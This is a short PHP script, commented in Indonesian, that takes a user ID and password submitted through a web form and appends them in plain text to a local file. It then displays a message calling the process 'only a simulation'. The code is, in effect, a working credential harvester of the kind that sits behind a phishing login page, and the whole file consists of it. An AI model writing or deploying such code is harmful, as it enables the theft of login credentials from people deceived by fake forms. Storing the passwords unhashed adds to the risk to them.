<?php
    // Ambil data dari form
    $user_id = $_POST['user-id'];
    $password = $_POST['password'];

    // Buat string untuk disimpan
    $data = "User ID: " . $user_id . " | Password: " . $password . "\n";

    // Simpan data ke file teks
    file_put_contents('data.txt', $data, FILE_APPEND);

    // Tampilkan pesan sukses
    echo "Data berhasil disimpan. Ini hanya simulasi!";
?>
